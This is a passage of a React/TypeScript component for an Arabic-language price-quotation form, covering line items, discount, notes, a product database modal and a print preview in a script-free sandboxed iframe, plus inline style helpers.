                                <div style={{ width: 40, height: 40, background: '#f0f2f8', borderRadius: 6, display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 20 }}>📦</div>
                              )}
                              <div style={{ flex: 1 }}>
                                <div style={{ fontWeight: 700, color: '#1a237e', fontSize: '13px' }}>{p.name}</div>
                                <div style={{ fontSize: '11px', color: '#757575' }}>{fmt(p.defaultPrice ?? 0)} د.ع  {p.unit || 'قطعة'}</div>
                              </div>
                            </div>
                          ))}
                        </div>
                      )}
                    </div>
                  </td>
                  <td style={{ padding: '10px 6px' }}>
                    <input value={item.unit} onChange={(e) => updateItem(index, { unit: e.target.value })} style={{ ...tableInputStyle, width: '80px' }} />
                  </td>
                  <td style={{ padding: '10px 6px' }}>
                    <input type="number" min={1} value={item.quantity} onChange={(e) => updateItem(index, { quantity: Number(e.target.value) })} style={{ ...tableInputStyle, width: '80px' }} />
                  </td>
                  <td style={{ padding: '10px 6px' }}>
                    <input type="number" min={0} value={item.unitPrice} onChange={(e) => updateItem(index, { unitPrice: Number(e.target.value) })} style={{ ...tableInputStyle, width: '110px' }} />
                  </td>
                  <td style={{ padding: '10px 6px', textAlign: 'center', fontWeight: 700, color: '#1a237e' }}>{fmt(item.totalPrice)}</td>
                  <td style={{ padding: '10px 6px', textAlign: 'center' }}>
                    <button type="button" onClick={() => removeRow(index)} style={{
                      background: '#c62828', color: 'white', border: 'none', padding: '6px 10px',
                      borderRadius: '6px', cursor: 'pointer', fontSize: '12px', fontFamily: 'inherit',
                    }}>حذف</button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      {/* ===== Discount Card ===== */}
      <div style={{
        background: 'linear-gradient(135deg, #fff8e1, #ffecb3)',
        border: '2px solid #ffa000', borderRadius: '12px', padding: '24px', marginBottom: '20px',
      }}>
        <div style={{ fontSize: '15px', fontWeight: 700, color: '#e65100', marginBottom: '16px', paddingBottom: '10px', borderBottom: '2px solid #ffe082' }}>
          الخصم والصافي
        </div>
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: '16px', maxWidth: '650px', margin: '0 auto' }}>
          <div>
            <label style={{ display: 'block', fontSize: '13px', fontWeight: 600, color: '#555', marginBottom: '6px' }}>نسبة الخصم (%)</label>
            <input type="number" min={0} max={100} value={discountPercent} onChange={(e) => setDiscountPercent(Number(e.target.value))} style={inputStyle({})} />
          </div>
          <div>
            <label style={{ display: 'block', fontSize: '13px', fontWeight: 600, color: '#555', marginBottom: '6px' }}>قيمة الخصم (د.ع)</label>
            <input readOnly value={fmt(discountValue) + ' د.ع'} style={inputStyle({ bg: '#fff', fw: 700, color: '#c62828', ta: 'center' })} />
          </div>
          <div>
            <label style={{ display: 'block', fontSize: '13px', fontWeight: 600, color: '#555', marginBottom: '6px' }}>الصافي بعد الخصم (د.ع)</label>
            <input readOnly value={fmt(netTotal) + ' د.ع'} style={inputStyle({ bg: '#fff', fw: 700, color: '#2e7d32', ta: 'center' })} />
          </div>
        </div>
      </div>

      {/* ===== Notes ===== */}
      <div style={{ background: 'white', borderRadius: '12px', padding: '24px', marginBottom: '20px', boxShadow: '0 2px 12px rgba(0,0,0,0.06)' }}>
        <div style={{ fontSize: '15px', fontWeight: 700, color: '#1a237e', marginBottom: '16px', paddingBottom: '10px', borderBottom: '2px solid #e8eaf6' }}>
          ملاحظات خاصة بالعرض
        </div>
        <textarea value={notes} onChange={(e) => setNotes(e.target.value)} placeholder="اكتب هنا أي ملاحظات إضافية..."
          rows={4} style={{ width: '100%', padding: '12px 14px', border: '1.5px solid #e0e0e0', borderRadius: '8px', fontSize: '14px', fontFamily: 'inherit', boxSizing: 'border-box' as const, outline: 'none', resize: 'vertical' }} />
      </div>

      {/* ===== Grand Total Box ===== */}
      <div style={{
        background: 'linear-gradient(135deg, #1a237e, #283593)',
        borderRadius: '12px', padding: '24px', marginBottom: '20px', textAlign: 'center',
      }}>
        <div style={{ color: '#b0bec5', fontSize: '14px', marginBottom: '8px' }}>الإجمالي الكلي للعرض</div>
        <div style={{ color: '#ffd54f', fontSize: '40px', fontWeight: 800 }}>{fmt(grandTotal)} د.ع</div>
      </div>

      {/* ===== Action Buttons ===== */}
      <div style={{ display: 'flex', gap: '12px', marginBottom: '20px', flexWrap: 'wrap' }}>
        <button onClick={() => setShowProductModal(true)} style={{
          background: 'linear-gradient(135deg, #00695c, #00897b)', color: 'white', border: 'none',
          padding: '14px 24px', borderRadius: '10px', cursor: 'pointer', fontWeight: 700, fontSize: '14px', fontFamily: 'inherit',
          flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px',
        }}>📦 إدارة المنتجات</button>
        <button onClick={handleSubmit} disabled={submitting} style={{
          background: 'linear-gradient(135deg, #1565c0, #1976d2)', color: 'white', border: 'none',
          padding: '14px 24px', borderRadius: '10px', cursor: submitting ? 'not-allowed' : 'pointer',
          fontWeight: 700, fontSize: '14px', fontFamily: 'inherit', flex: 1, opacity: submitting ? 0.6 : 1,
          display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px',
        }}>💾 {isEdit ? 'حفظ التعديلات' : 'حفظ العرض'}</button>
        {returnTo && (
          <button onClick={openPreview} style={{
            background: 'linear-gradient(135deg, #2e7d32, #43a047)', color: 'white', border: 'none',
            padding: '14px 24px', borderRadius: '10px', cursor: 'pointer', fontWeight: 700, fontSize: '14px', fontFamily: 'inherit',
            flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px',
          }}>✓ تم — معاينة العرض</button>
        )}
        {isEdit && (
          <button onClick={() => navigate('/quotations')} style={{
            background: '#607d8b', color: 'white', border: 'none',
            padding: '14px 24px', borderRadius: '10px', cursor: 'pointer', fontWeight: 700, fontSize: '14px', fontFamily: 'inherit',
            flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px',
          }}>↩ رجوع لقائمة العروض</button>
        )}
        <button onClick={() => handlePrint(true)} style={{
          background: 'linear-gradient(135deg, #e65100, #ef6c00)', color: 'white', border: 'none',
          padding: '14px 24px', borderRadius: '10px', cursor: 'pointer', fontWeight: 700, fontSize: '14px', fontFamily: 'inherit',
          flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px',
        }}>🖨️ طباعة مع صور</button>
        <button onClick={() => handlePrint(false)} style={{
          background: 'linear-gradient(135deg, #546e7a, #78909c)', color: 'white', border: 'none',
          padding: '14px 24px', borderRadius: '10px', cursor: 'pointer', fontWeight: 700, fontSize: '14px', fontFamily: 'inherit',
          flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px',
        }}>🖨️ طباعة بدون صور</button>
      </div>

      {/* ===== Status Message ===== */}
      {statusMsg && (
        <div style={{
          padding: '14px 20px', borderRadius: '10px', textAlign: 'center', fontWeight: 700, fontSize: '14px',
          marginBottom: '20px',
          background: statusMsg.type === 'ok' ? '#e8f5e9' : '#ffebee',
          color: statusMsg.type === 'ok' ? '#2e7d32' : '#c62828',
          border: `1px solid ${statusMsg.type === 'ok' ? '#a5d6a7' : '#ef9a9a'}`,
        }}>{statusMsg.text}</div>
      )}

      {/* ===== Product Manager Modal ===== */}
      {showProductModal && (
        <div onClick={(e) => { if (e.target === e.currentTarget) setShowProductModal(false) }}
          style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.5)', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 9999 }}>
          <div style={{ background: '#fff', borderRadius: '14px', width: '100%', maxWidth: '740px', margin: 'auto', overflow: 'hidden', boxShadow: '0 20px 60px rgba(0,0,0,0.25)', maxHeight: '90vh', overflowY: 'auto' }}>
            <div style={{
              background: 'linear-gradient(135deg, #1a237e, #283593)', color: '#fff',
              padding: '20px 26px', display: 'flex', justifyContent: 'space-between', alignItems: 'center',
            }}>
              <h3 style={{ margin: 0, fontSize: '16px', fontWeight: 700 }}>📦 إدارة قاعدة بيانات المنتجات</h3>
              <button onClick={() => setShowProductModal(false)} style={{
                background: 'rgba(255,255,255,0.15)', border: 'none', color: '#fff',
                width: '34px', height: '34px', borderRadius: '50%', cursor: 'pointer', fontSize: '16px', fontFamily: 'inherit',
              }}>✕</button>
            </div>
            <div style={{ padding: '24px' }}>
              {/* Add form */}
              <div style={{ background: '#f5f7ff', border: '1px solid #e8eaf6', borderRadius: '10px', padding: '20px', marginBottom: '24px' }}>
                <div style={{ fontSize: '14px', fontWeight: 700, color: '#1a237e', marginBottom: '14px', paddingBottom: '10px', borderBottom: '2px solid #e8eaf6' }}>
                  ➕ إضافة منتج جديد
                </div>
                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '14px' }}>
                  <div>
                    <label style={{ display: 'block', fontSize: '13px', fontWeight: 600, color: '#555', marginBottom: '6px' }}>
                      <span style={{ color: '#c62828' }}>*</span> اسم المنتج
                    </label>
                    <input value={pmName} onChange={(e) => setPmName(e.target.value)} placeholder="مثال: لوح شمسي 400 واط" style={inputStyle({})} />
                  </div>
                  <div>
                    <label style={{ display: 'block', fontSize: '13px', fontWeight: 600, color: '#555', marginBottom: '6px' }}>وحدة القياس</label>
                    <input value={pmUnit} onChange={(e) => setPmUnit(e.target.value)} style={inputStyle({})} />
                  </div>
                  <div>
                    <label style={{ display: 'block', fontSize: '13px', fontWeight: 600, color: '#555', marginBottom: '6px' }}>السعر الافتراضي (د.ع)</label>
                    <input type="number" min={0} value={pmPrice} onChange={(e) => setPmPrice(Number(e.target.value))} style={inputStyle({})} />
                  </div>
                  <div style={{ gridColumn: '1 / -1' }}>
                    <label style={{ display: 'block', fontSize: '13px', fontWeight: 600, color: '#555', marginBottom: '6px' }}>صورة المنتج (اختياري)</label>
                    <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                      <input type="file" accept="image/*" onChange={handleImageUpload} style={{ fontSize: 13 }} />
                      {pmImage && <img src={pmImage} style={{ width: 60, height: 60, objectFit: 'contain', borderRadius: 8, border: '1px solid #e0e0e0' }} />}
                    </div>
                  </div>
                </div>
                <button onClick={handlePmSave} style={{
                  width: '100%', padding: '13px', marginTop: '14px',
                  background: 'linear-gradient(135deg, #1a237e, #283593)', color: '#fff', border: 'none',
                  borderRadius: '8px', fontSize: '14px', fontWeight: 700, cursor: 'pointer', fontFamily: 'inherit',
                }}>💾 حفظ المنتج في القاعدة</button>
                {pmStatus && <div style={{ textAlign: 'center', fontSize: '13px', fontWeight: 600, marginTop: '10px' }}>{pmStatus}</div>}
              </div>
              {/* Products list */}
              <div>
                <div style={{ fontSize: '14px', fontWeight: 700, color: '#1a237e', marginBottom: '14px', paddingBottom: '10px', borderBottom: '2px solid #e8eaf6', display: 'flex', alignItems: 'center', gap: '10px' }}>
                  المنتجات المخزونة <span style={{ background: '#1a237e', color: '#fff', padding: '2px 12px', borderRadius: '20px', fontSize: '12px' }}>{products.length}</span>
                </div>
                {products.length === 0 ? (
                  <div style={{ textAlign: 'center', color: '#9e9e9e', padding: '30px' }}>
                    <div style={{ fontSize: '36px', marginBottom: '8px' }}>📦</div>لا توجد منتجات بعد!
                  </div>
                ) : (
                  <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(130px, 1fr))', gap: '12px' }}>
                    {products.map((p) => (
                      <div key={p.id} style={{ background: '#fff', border: '1px solid #e0e0e0', borderRadius: '10px', overflow: 'hidden', textAlign: 'center' }}>
                        {p.imageBase64 ? (
                          <img src={fileUrl(p.imageBase64)} style={{ width: '100%', height: 90, objectFit: 'contain', background: '#fafafa' }} />
                        ) : (
                          <div style={{ width: '100%', height: '90px', background: 'linear-gradient(135deg, #e8eaf6, #f5f7ff)', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '32px' }}>📦</div>
                        )}
                        <div style={{ padding: '8px 6px' }}>
                          <div style={{ fontWeight: 700, fontSize: '12px', color: '#1a237e' }}>{p.name}</div>
                          <div style={{ fontSize: '10px', color: '#757575' }}>{p.unit || 'قطعة'}</div>
                          <div style={{ fontSize: '11px', color: '#2e7d32', fontWeight: 700, marginTop: '2px' }}>{fmt(p.defaultPrice ?? 0)} د.ع</div>
                          <button onClick={() => handlePmDelete(p.id)} style={{
                            background: '#c62828', color: '#fff', border: 'none', padding: '5px 0',
                            borderRadius: '5px', cursor: 'pointer', fontSize: '11px', fontFamily: 'inherit',
                            marginTop: '6px', width: 'calc(100% - 12px)',
                          }}>🗑 حذف</button>
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>
      )}
      </>
      )}

      {/* معاينة العرض — نفس النسخة الي تنطبع بالضبط، للاطلاع فقط (مثل PDF).
          التعديل ما يصير من هنا: يغلق المعاينة ويرجع للنموذج. */}
      {previewHtml && (
        <div style={{
          position: 'fixed', inset: 0, zIndex: 3000, background: 'rgba(0,0,0,0.6)',
          display: 'flex', flexDirection: 'column', padding: '16px', gap: '12px',
        }}>
          <div style={{
            display: 'flex', flexWrap: 'wrap', gap: '8px', justifyContent: 'center',
            background: 'white', padding: '12px', borderRadius: '12px',
          }}>
            <span style={{ fontWeight: 800, color: '#0f2040', alignSelf: 'center', marginLeft: 'auto' }}>
              👁️ معاينة العرض (نسخة الطباعة)
            </span>
            <button onClick={() => setPreviewHtml(null)} style={{
              background: '#1565c0', color: 'white', border: 'none', padding: '10px 18px',
              borderRadius: '8px', cursor: 'pointer', fontWeight: 700, fontFamily: 'inherit',
            }}>✏️ تعديل هذا العرض</button>
            <button onClick={() => { setPreviewHtml(null); navigate('/quotations/new' + (returnTo ? `?returnTo=${encodeURIComponent(returnTo)}` : '')); window.location.reload() }} style={{
              background: '#00838f', color: 'white', border: 'none', padding: '10px 18px',
              borderRadius: '8px', cursor: 'pointer', fontWeight: 700, fontFamily: 'inherit',
            }}>➕ عرض سعر جديد</button>
            <button onClick={() => handlePrint(true)} style={{
              background: '#e65100', color: 'white', border: 'none', padding: '10px 18px',
              borderRadius: '8px', cursor: 'pointer', fontWeight: 700, fontFamily: 'inherit',
            }}>🖨️ طباعة</button>
            {returnTo && (
              <button onClick={() => navigate(returnTo)} style={{
                background: '#2e7d32', color: 'white', border: 'none', padding: '10px 18px',
                borderRadius: '8px', cursor: 'pointer', fontWeight: 700, fontFamily: 'inherit',
              }}>✓ رجوع لإدارة المشاريع</button>
            )}
          </div>
          <iframe
            title="معاينة عرض السعر"
            // sandbox بدون allow-scripts: المحتوى ثابت وما يحتاج جافاسكربت،
            // فحتى لو تسرّب وسم خبيث ما ينفّذ، وما يقدر يوصل لـlocalStorage
            // ولا لكوكيز الصفحة الأم (طبقة دفاع ثانية بعد التهريب).
            sandbox=""
            srcDoc={previewHtml}
            style={{ flex: 1, width: '100%', border: 'none', borderRadius: '12px', background: 'white' }}
          />
        </div>
      )}
    </div>
  )
}

function inputStyle(opts: { bg?: string; fw?: number; color?: string; ta?: React.CSSProperties['textAlign'] }): React.CSSProperties {
  return {
    width: '100%', padding: '11px 13px', border: '1.5px solid #e0e0e0', borderRadius: '8px',
    fontSize: '14px', fontFamily: 'inherit', background: opts.bg || '#fff',
    boxSizing: 'border-box', outline: 'none',
    fontWeight: opts.fw, color: opts.color, textAlign: opts.ta,
  }
}

const thStyle = (opts: { width: string }): React.CSSProperties => ({
  background: '#1a237e', color: 'white', padding: '10px 8px',
  fontSize: '13px', fontWeight: 700, textAlign: 'center', width: opts.width,
})

const customerFieldStyle = (hasBorderLeft: boolean): React.CSSProperties => ({
  padding: '14px 18px',
  borderLeft: hasBorderLeft ? '1px solid #e8eaf6' : 'none',
})

const customerLabelStyle: React.CSSProperties = {
  display: 'block', fontSize: '12px', fontWeight: 600, color: '#666', marginBottom: '6px',
}

const customerInputStyle: React.CSSProperties = {
  width: '100%', padding: '10px 0', border: 'none', borderBottom: '1.5px solid #e0e0e0',
  fontSize: '14px', fontFamily: 'inherit', outline: 'none', background: 'transparent',
}

const tableInputStyle: React.CSSProperties = {
  width: '100%', padding: '8px 10px', border: '1px solid #e8eaf6', borderRadius: '6px',
  fontSize: '13px', fontFamily: 'inherit', outline: 'none', boxSizing: 'border-box',
  textAlign: 'center',
}
